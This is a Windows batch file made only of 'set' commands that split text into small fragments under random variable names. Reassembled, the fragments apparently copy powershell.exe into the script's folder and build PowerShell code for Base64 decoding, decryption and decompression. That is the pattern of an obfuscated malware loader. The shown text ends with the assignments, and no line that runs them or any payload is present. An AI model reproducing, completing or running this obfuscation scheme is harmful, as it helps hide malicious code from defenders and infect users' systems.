@echo off
set "EsvgCyQqMh=ow"
set "GXUrgqoCab=.e"
set "SLKCNFHmhp=1."
set "ParTuMEhhB=\W"
set "ssmmjbvFGw= C"
set "xdAvPVTjLb=py"
set "hiIRIaYcCc=co"
set "IHVIFHWxFG=ws"
set "zZmkIIPYRe=:\"
set "fUrHfcSctK=s\"
set "xsxiIEJQZS=Sy"
set "ovAPZwydWa=Po"
set "fxkwwmmygS=y "
set "vmhUTAEMtt=rS"
set "InqasSCIri=em"
set "kgQnjzMioW=he"
set "NUqwkPVwIH=nd"
set "nERkBGzIRz=he"
set "ATmIXwhqQz=ll"
set "bayRWSqsan=do"
set "WtEqYIMvze= /"
set "kywJWOCAXC=we"
set "umvadjllMQ=ll"
set "sSMsHICTmy=we"
set "WTcXjlVmyY=32"
set "izvYbjbwQP=in"
set "MtqkzDUtHu=st"
set "CZdwBmNbVc=rs"
set "fwzdlboGWy=\v"
set "WqzjSzEdhx=Wi"
set "psZCnQfNZz=po"
set "pTIyhiQhQJ=0\"
set "cdRWplczjh=xe"
set "pPLPZbgRRj=cd"
set "PpmynrCpiq= %~dp0"
set "lLgCyzYzSY=saBm"
set "aqJBqAoVUy=.Con"
set "WYgXMvzVWd=3); "
set "tkHvMyGLyW=, (,"
set "XHOBuufSbV=$Lty"
set "LFuSIgKObr=$BGm"
set "DJObTbiyNo=M.Pa"
set "wXupZZCrnX=tJJQ"
set "jMBehnDnmA=Comp"
set "RGKwqVyFHu=JJQW"
set "UKANTTMAee=-4] "
set "ljkqoRiFvo=Secu"
set "oiHOEiNrsZ=m(, "
set "mgHmfwzBKD=.Mod"
set "XREUzjTUxF= [Sy"
set "qaiMdeSWoZ=ateD"
set "WleJCuJolM=  $T"
set "hLcElGpgYa=pStr"
set "tbUqfXipTI=tem."
set "VeFFADOJUl=comm"
set "pLAouabvQV=Conv"
set "LiWhdWictE=AcFF"
set "CrvvzzWTUt=W = "
set "vnEsxOEfHO=; };"
set "vYtEzYuyVQ='[-1"
set "mLdNnEJijQ=($zO"
set "isUxkdxdND=)($t"
set "CQSpQsJGJT=::De"
